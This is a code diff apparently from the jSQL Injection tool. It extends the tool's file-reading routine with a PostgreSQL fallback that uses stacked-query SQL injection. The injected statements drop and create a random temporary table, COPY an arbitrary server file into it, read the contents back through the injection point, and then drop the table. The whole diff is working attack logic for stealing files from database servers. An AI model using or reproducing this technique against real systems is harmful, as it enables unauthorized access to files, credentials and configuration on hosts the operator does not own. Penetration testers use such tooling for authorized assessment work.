@@ -6,6 +6,7 @@ import com.jsql.model.exception.InjectionFailureException;
 import com.jsql.model.exception.StoppedByUserSlidingException;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.LogLevelUtil;
+import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
@@ -59,14 +60,42 @@ public class CallableFile implements Callable<CallableFile> {
 
         String resultToParse = StringUtils.EMPTY;
         try {
-            resultToParse = this.suspendableReadFile.run(
-                this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
-                sourcePage,
-                false,
-                1,
-                MockElement.MOCK,
-                "file"
-            );
+            if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getMysql()) {
+                resultToParse = this.suspendableReadFile.run(
+                    this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
+                    sourcePage,
+                    false,
+                    1,
+                    MockElement.MOCK,
+                    "mysql#file"
+                );
+            } else if (this.injectionModel.getMediatorVendor().getVendor() == this.injectionModel.getMediatorVendor().getPostgres()) {
+                try {
+                    resultToParse = this.suspendableReadFile.run(
+                        this.injectionModel.getMediatorVendor().getVendor().instance().sqlFileRead(this.pathFile),
+                        sourcePage,
+                        false,
+                        1,
+                        MockElement.MOCK,
+                        "pg#file"
+                    );
+                } catch (InjectionFailureException e) {
+                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read failure, retrying with stack read");
+                    var nameLibraryRandom = "tmp_"+ RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
+                    this.injectionModel.injectWithoutIndex(";drop table "+ nameLibraryRandom +";", "pg#drop-tbl");
+                    this.injectionModel.injectWithoutIndex(";create table "+ nameLibraryRandom +"(data text);", "pg#add-tbl");
+                    this.injectionModel.injectWithoutIndex(";copy "+ nameLibraryRandom +"(data) from '"+ this.pathFile +"' delimiter E'\\x01';", "pg#copy");
+                    resultToParse = this.suspendableReadFile.run(
+                        "array_to_string(array(select * from "+ nameLibraryRandom +"),'\\n')",
+                        sourcePage,
+                        false,
+                        1,
+                        MockElement.MOCK,
+                        "pg#get-tbl"
+                    );
+                    this.injectionModel.injectWithoutIndex(";drop table "+ nameLibraryRandom +";", "pg#drop-tbl");
+                }
+            }
         } catch (InjectionFailureException e) {
             // Usually thrown if File does not exist
             LOGGER.log(LogLevelUtil.IGNORE, e);
